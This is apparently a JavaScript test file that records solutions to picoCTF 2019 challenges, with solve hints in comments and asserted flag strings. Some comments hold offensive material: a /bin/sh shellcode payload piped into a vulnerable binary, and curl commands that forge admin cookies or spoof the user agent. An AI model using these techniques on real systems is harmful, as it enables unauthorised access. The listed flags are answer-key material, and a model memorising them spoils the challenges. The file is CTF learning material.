import solve from 'tape';

import * as h from '../../index.mjs';

const flagRegexp = /picoCTF{.*}/;

const flag = (x) => `picoCTF{${x}}`;

const grabFlag = h.pipe([h.match(flagRegexp), h.prop('match')]);

const findFlagInFile = (path) => {
  return h.pipeFile([
    h.toString('utf8'),
    h.lines,
    h.filter(h.test(flagRegexp)),
    h.head,
    grabFlag,
  ])(path);
};

solve("The Factory's Secret", (s) => {
  // play the game
  const f = 'picoCTF{zerozerozerozero}';
  s.equal(f, 'picoCTF{zerozerozerozero}');
  s.end();
});

solve('2Warm', (s) => {
  s.equal(flag(h.recode(10)(2)(42)), 'picoCTF{101010}');
  s.end();
});

solve('Glory of the Garden', (s) => {
  const f = findFlagInFile('./glory-of-the-garden.jpg');
  s.equal(f, 'picoCTF{more_than_m33ts_the_3y36BCA684D}');
  s.end();
});

solve('Insp3ct0r', (s) => {
  // https://2019shell1.picoctf.com/problem/61676/
  // inspect html, mycss.css, myjs.js for flags
  const p1 = 'picoCTF{tru3_d3';
  const p2 = 't3ct1ve_0r_ju5t';
  const p3 = '_lucky?1638dbe7}';
  const f = p1 + p2 + p3;
  s.equal(f, 'picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?1638dbe7}');
  s.end();
});

solve('Lets Warm Up', (s) => {
  const n = h.recode(16)(10)('0x70');
  const ascii = h.decToAscii(n);
  s.equal(flag(ascii), 'picoCTF{p}');
  s.end();
});

solve('The Numbers', (s) => {
  const c = '16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }';
  const d = (x) => h.ALPHABETS[h.stringToInt(10)(x) - 1] || x;
  const p = h.pipe([h.splitOn(' '), h.map(d), h.joinWith('')])(c);
  s.equal(p, 'PICOCTF{THENUMBERSMASON}');
  s.end();
});

solve('Warmed Up', (s) => {
  s.equal(flag(h.recode(16)(10)('0x3D')), 'picoCTF{61}');
  s.end();
});

solve('handy-shellcode', (s) => {
  // run the following in terminal
  // (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat) | ./vuln
  const f = 'picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}';
  s.equal(f, 'picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}');
  s.end();
});

solve('practice-run-1', (s) => {
  // log into shell and folder and execute with './run_this'
  const f = 'picoCTF{g3t_r3adY_2_r3v3r53}';
  s.equal(f, 'picoCTF{g3t_r3adY_2_r3v3r53}');
  s.end();
});

solve('unzip', (s) => {
  // unzip with 'tar -xvzf flag.zip'
  const f = 'unz1pp1ng_1s_3a5y';
  s.equal(flag(f), 'picoCTF{unz1pp1ng_1s_3a5y}');
  s.end();
});

solve('vault-door-training', (s) => {
  // reverse engineer ./VaultDoorTraining.java
  const f = 'w4rm1ng_Up_w1tH_jAv4_e57d01a632a';
  s.equal(flag(f), 'picoCTF{w4rm1ng_Up_w1tH_jAv4_e57d01a632a}');
  s.end();
});

solve('13', (s) => {
  const c = 'cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}';
  const rot13 = h.caesarCipher(13);
  const p = rot13(c);
  s.equal(p, 'picoCTF{not_too_bad_of_a_problem}');
  s.end();
});

solve('Bases', (s) => {
  s.equal(flag(h.atob('bDNhcm5fdGgzX3IwcDM1')), 'picoCTF{l3arn_th3_r0p35}');
  s.end();
});

solve('Easy1', (s) => {
  const c = 'UFJKXQZQUNB';
  const p = h.vigenereCipher('SOLVECRYPTO')(c);
  s.equal(flag(p), 'picoCTF{CRYPTOISFUN}');
  s.end();
});

solve('First Grep', (s) => {
  const f = findFlagInFile('./first-grep');
  s.equal(f, 'picoCTF{grep_is_good_to_find_things_4b2451ea}');
  s.end();
});

solve('OverFlow 0', (s) => {
  // visit shellserver and inspect code in vuln.c
  // provide an arg that is larger than 128bytes
  const f = 'picoCTF{3asY_P3a5y2f814ddc}';
  s.equal(f, 'picoCTF{3asY_P3a5y2f814ddc}');
  s.end();
});

solve('Resources', (s) => {
  // visit link: https://picoctf.org/resources
  // search for "picoCTF{"
  const f = 'picoCTF{r3source_pag3_f1ag}';
  s.equal(f, 'picoCTF{r3source_pag3_f1ag}');
  s.end();
});

solve('caesar', (s) => {
  const c = 'jyvzzpunaolybipjvunfzpthre';
  const d = (shift) => h.caesarCipher(shift)(c);
  const ps = h.range(0)(25).map(d);
  // determine plaintext candidate from ps
  const p = 'crossingtherubicongysimakx';
  s.ok(ps.includes(p));
  s.equal(flag(p), 'picoCTF{crossingtherubicongysimakx}');
  s.end();
});

solve('dont-use-client-side', (s) => {
  // reverse engineer `verify` method in <script /> tag
  const parts = ['pico', 'CTF{', 'no_c', 'lien', 'ts_p', 'lz_5', '7743', '1}'];
  s.equal(h.joinWith('')(parts), 'picoCTF{no_clients_plz_577431}');
  s.end();
});

solve('logon', (s) => {
  // curl https://2019shell1.picoctf.com/problem/49907/login -H 'Referer: https://2019shell1.picoctf.com/problem/49907/' -H 'Cookie: password=password; username=admin; admin=True' --data-raw 'user=admin&password=password' -iL | grep picoCTF{
  const f = 'picoCTF{th3_c0nsp1r4cy_l1v3s_9e21365b}';
  s.equal(f, 'picoCTF{th3_c0nsp1r4cy_l1v3s_9e21365b}');
  s.end();
});

solve('strings it', (s) => {
  const f = findFlagInFile('./strings-it');
  s.equal(f, 'picoCTF{5tRIng5_1T_c7fff9e5}');
  s.end();
});

solve('vault-door-1', (s) => {
  // reverse engineer ./VaultDoor1.java
  const parts = ["d", "3", "5", "c", "r", "4", "m", "b", "l", "3", "_", "t", "H", "3", "_", "c", "H", "4", "r", "4", "c", "T", "3", "r", "5", "_", "5", "1", "e", "7", "f", "d"]; // eslint-disable-line prettier/prettier
  s.equal(
    flag(h.joinWith('')(parts)),
    'picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_51e7fd}',
  );
  s.end();
});

solve("what's a net cat?", (s) => {
  // connect with "nc 2019shell1.picoctf.com 4158"
  const f = 'picoCTF{nEtCat_Mast3ry_700da9c7}';
  s.equal(f, 'picoCTF{nEtCat_Mast3ry_700da9c7}');
  s.end();
});

solve('where are the robots', (s) => {
  // curl https://2019shell1.picoctf.com/problem/4159
  // curl https://2019shell1.picoctf.com/problem/4159/robots.txt
  // curl https://2019shell1.picoctf.com/problem/4159/a44f7.html | grep picoCTF{
  const f = 'picoCTF{ca1cu1at1ng_Mach1n3s_a44f7}';
  s.equal(f, 'picoCTF{ca1cu1at1ng_Mach1n3s_a44f7}');
  s.end();
});

solve.skip('OverFlow 1', (s) => {
  s.end();
});

solve('So Meta', (s) => {
  const f = findFlagInFile('./so-meta.png');
  s.equal(f, 'picoCTF{s0_m3ta_505fdd8b}');
  s.end();
});

solve('What Lies Within', (s) => {
  // [cheat]: used an online steganography decoder
  // todo: write a steganography decoder
  const f = 'picoCTF{h1d1ng_1n_th3_b1t5}';
  s.equal(f, 'picoCTF{h1d1ng_1n_th3_b1t5}');
  s.end();
});

solve('extensions', (s) => {
  // try to grep for the flag in the content
  const mime = h.pipeFile([h.toString('utf8'), h.lines, h.head])(
    './extensions.txt',
  );
  console.log(mime);
  // confirm the mime type and change the file extension to .png
  // grab the flag visually
  const f = 'picoCTF{now_you_know_about_extensions}';
  s.equal(f, 'picoCTF{now_you_know_about_extensions}');
  s.end();
});

solve('shark on wire 1', (s) => {
  // install wireshark and load .pcap file
  // click on a UDP entry and follow the stream
  // search for "picoCTF{" across streams
  // grab the flag in stream 6
  const f = 'picoCTF{StaT31355_636f6e6e}';
  s.equal(f, 'picoCTF{StaT31355_636f6e6e}');
  s.end();
});

solve('Based', (s) => {
  const serialize = (b) =>
    h.pipe([
      h.splitOn(' '),
      h.map(h.pipe([h.recode(b)(10), h.decToAscii])),
      h.joinWith(''),
    ]);

  const i1 = '01110100 01100101 01110011 01110100';
  const i2 = '154 141 155 160';
  const i3 = '63 6f 6d 70 75 74 65 72';

  const a1 = serialize(2)(i1);
  const a2 = serialize(8)(i2);
  const a3 = serialize(16)(i3);

  console.log(a1, a2, a3);

  // grab the flag
  const f = 'picoCTF{learning_about_converting_values_502ff297}';
  s.equal(f, 'picoCTF{learning_about_converting_values_502ff297}');
  s.end();
});

solve('Client-side-again', (s) => {
  // deobfuscate the script file (see ./client-side-again.js)
  const parts = ['picoCTF{', 'not_this', '_again_d', '29871}'];
  const f = h.joinWith('')(parts);
  s.equal(f, 'picoCTF{not_this_again_d29871}');
  s.end();
});

solve('First Grep: Part II', (s) => {
  // grep on CLI with "grep -nr picoCTF{"
  const f = 'picoCTF{grep_r_to_find_this_5241c61f}';
  s.equal(f, 'picoCTF{grep_r_to_find_this_5241c61f}');
  s.end();
});

solve('Flags', (s) => {
  // use custom substitution cypher https://www.dcode.fr/maritime-signals-code
  // encode flags in png file and assign to mapping
  const mapping = {
    f1: 'P',
    f2: 'I',
    f3: 'C',
    f4: 'O',
    f5: 'T',
    f6: 'F',
    f7: '1',
    f8: 'A',
    f9: 'G',
    f10: '5',
    f11: 'N',
    f12: 'D',
    f13: 'U',
  };
  const c = ["f1", "f2", "f3", "f4", "f3", "f5", "f6", "{", "f6", "f7", "f8", "f9", "f10", "f8", "f11", "f12", "f10", "f5", "f13", "f6", "f6", "}"]; // eslint-disable-line prettier/prettier
  const p = h.pipe([h.substitutionCipher(mapping), h.joinWith('')])(c);
  s.equal(p, 'PICOCTF{F1AG5AND5TUFF}');
  s.end();
});

solve('Mr-Worldwide', (s) => {
  // track coordinates separated by '_'
  const coords1 = [
    [35.028309, 135.753082],
    [46.469391, 30.740883],
    [39.758949, -84.191605],
    [41.015137, 28.97953],
    [24.466667, 54.366669],
    [3.140853, 101.693207],
  ];
  const coords2 = [
    [9.005401, 38.763611],
    [-3.989038, -79.20356],
    [52.377956, 4.89707],
    [41.085651, -73.858467],
    [57.790001, -152.407227],
    [31.205753, 29.924526],
  ];
  console.log(coords1, coords2);
  // track cities
  const locations1 = [
    'Kyoto',
    'Odesa',
    'Dayton',
    'Istanbul',
    'Abu Dhabi',
    'Kuala Lumpur',
  ];
  const locations2 = [
    'Addis Ababa',
    'Loja',
    'Amsterdam',
    'Sleepy Hollow',
    'Kodiak',
    'Alexandria Governorate',
  ];
  // the flag seems to be the first letters of cities, which spells out KODIAK-ALASKA (which is also conveniently hidden in locations2)
  const getFirstChars = h.pipe([
    h.map(h.pipe([h.splitOn(''), h.head])),
    h.joinWith(''),
  ]);
  const f = `${getFirstChars(locations1)}_${getFirstChars(locations2)}`;
  s.equal(flag(f), 'picoCTF{KODIAK_ALASKA}');
  s.end();
});

solve('Open-to-admins', (s) => {
  // curl "https://2019shell1.picoctf.com/problem/49858/flag" -H "Cookie: time=1400; admin=True" | grep picoCTF{
  const f = 'picoCTF{0p3n_t0_adm1n5_effb525e}';
  s.equal(f, 'picoCTF{0p3n_t0_adm1n5_effb525e}');
  s.end();
});

solve('Tapping', (s) => {
  const c =
    '.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ...-- ....- ---.. ---.. ---.. --... .---- ----- ..... }';
  const p = h.pipe([
    h.splitOn(' '),
    h.substitutionCipher(h.MORSE_CODE_MAPPING),
    h.joinWith(''),
  ])(c);
  s.equal(p, 'PICOCTF{M0RS3C0D31SFUN348887105}');
  s.end();
});

solve('la cifra de', (s) => {
  // [cheat] referenced and used https://www.guballa.de/vigenere-solver to break the cipher
  // todo: write an autosolver
  const f = 'picoCTF{b311a50_0r_v1gn3r3_c1ph3re62e044a}';
  s.equal(f, 'picoCTF{b311a50_0r_v1gn3r3_c1ph3re62e044a}');
  s.end();
});

solve('picobrowser', (s) => {
  // curl https://2019shell1.picoctf.com/problem/21851/flag -A "picobrowser" | grep picoCTF{
  const f = 'picoCTF{p1c0_s3cr3t_ag3nt_3e1c0ea2}';
  s.equal(f, 'picoCTF{p1c0_s3cr3t_ag3nt_3e1c0ea2}');
  s.end();
});

solve('plumbing', (s) => {
  // pipe the stdout with "nc 2019shell1.picoctf.com 63345 | grep picoCTF{"
  const f = 'picoCTF{digital_plumb3r_4e7a5813}';
  s.equal(f, 'picoCTF{digital_plumb3r_4e7a5813}');
  s.end();
});

solve.skip('rsa-pop-quiz', (s) => {
  s.end();
});

solve('vault-door-3', (s) => {
  // reverse-engineer ./VaultDoor3.java
  const password = 'jU5t_a_sna_3lpm12gb44_u_4_m1r240';
  const d = (c) => {
    const buffer = Array.from({ length: 32 });
    let i = 0;
    for (; i < 8; i++) {
      buffer[i] = c[i];
    }
    for (; i < 16; i++) {
      buffer[i] = c[23 - i];
    }
    for (; i < 32; i++) {
      buffer[i] = c[46 - i];
    }
    for (i = 31; i >= 17; i -= 2) {
      buffer[i] = c[i];
    }
    return h.joinWith('')(buffer.filter((x) => x));
  };
  s.equal(flag(d(password)), 'picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_41b220}');
  s.end();
});

solve('whats-the-difference', (s) => {
  // output the diff of two files using "cmp"
  // cmp kitters.jpg cattos.jpg -l > whats-the-difference
  // pipe and assemble 3rd column (ASCII numbers)
  const f = h.pipeFile([
    h.toString('utf-8'),
    h.lines,
    h.map(
      h.pipe([h.trim, h.splitOn(' '), h.last, h.stringToInt(10), h.octToAscii]),
    ),
    h.joinWith(''),
    h.tap('after split'),
  ])('./whats-the-difference');
  s.equal(
    f,
    'picoCTF{th3yr3_a5_d1ff3r3nt_4s_bu773r_4nd_j311y_aslkjfdsalkfslkflkjdsfdszmz10548}',
  );
  s.end();
});

solve('where-is-the-file', (s) => {
  // list files with "ls -la"
  // grab flag
  const f = 'picoCTF{w3ll_that_d1dnt_w0RK_f28cde66}';
  s.equal(f, 'picoCTF{w3ll_that_d1dnt_w0RK_f28cde66}');
  s.end();
});

solve('WhitePages', (s) => {
  // file contains only 20 (whitespace) and e28083 hex characters
  // experiment binary candidates to retrieve ascii codes
  const f = h.pipeFile([
    h.toString('hex'),
    h.replace(/20/g)('1'),
    h.replace(/e28083/g)('0'),
    h.chunkString(8),
    h.map(h.pipe([h.recode(2)(8), h.octToAscii])),
    h.joinWith(''),
    grabFlag,
    h.tap('final'),
  ])('./whitepages.txt');
  s.equal(
    f,
    'picoCTF{not_all_spaces_are_created_equal_c167040c738e8bcae2109ef4be5960b1}',
  );
  s.end();
});

solve.skip('c0rrupt', (s) => {
  s.end();
});

solve.skip('like1000', (s) => {
  s.end();
});

solve.skip('m00nwalk', (s) => {
  s.end();
});

solve.skip('vault-door-4', (s) => {
  s.end();
});

solve.skip('Irish-Name-Repo 1', (s) => {
  s.end();
});

solve.skip('flag_shop', (s) => {
  s.end();
});

solve.skip('mus1c', (s) => {
  s.end();
});

solve.skip('shark on wire 2', (s) => {
  s.end();
});

solve.skip('waves over lambda', (s) => {
  s.end();
});

solve.skip('Irish-Name-Repo 2', (s) => {
  s.end();
});

solve.skip('Empire1', (s) => {
  s.end();
});

solve.skip('Irish-Name-Repo 3', (s) => {
  s.end();
});

solve.skip('JaWT Scratchpad', (s) => {
  s.end();
});

solve.skip('Java Script Kiddie', (s) => {
  s.end();
});

solve.skip('cereal hacker 1', (s) => {
  s.end();
});

solve.skip('Ghost_Diary', (s) => {
  s.end();
});
